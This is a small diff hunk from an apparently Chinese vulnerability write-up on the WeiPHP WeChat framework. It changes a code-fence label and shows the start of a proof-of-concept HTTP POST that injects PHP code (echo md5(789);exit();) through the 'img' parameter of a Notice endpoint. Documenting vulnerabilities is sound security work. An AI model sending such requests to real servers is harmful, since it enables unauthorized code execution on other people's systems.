@@ -54,7 +54,7 @@ WeiPHP是一款基于PHP开发的开源微信公众号开发框架。它提供�
 + 特征
 
 # 四、漏洞复现
-```java
+```http
 POST /public/index.php/weixin/Notice/index?img=echo+md5(789);exit(); HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
